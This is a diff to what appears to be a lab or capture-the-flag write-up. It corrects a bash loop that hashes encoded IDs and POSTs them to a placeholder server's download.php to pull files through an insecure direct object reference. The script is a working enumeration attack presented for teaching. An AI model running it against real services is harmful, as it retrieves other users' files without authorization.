@@ -227,7 +227,7 @@ Now we make a post request to actually download the files.
 ```bash
 #! /bin/bash
 for i in {1..10}; do
-    for hash in $echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
         curl -SOJ -X POST -d "contract=$hash" http://server_ip:port/download.php
     done
 done
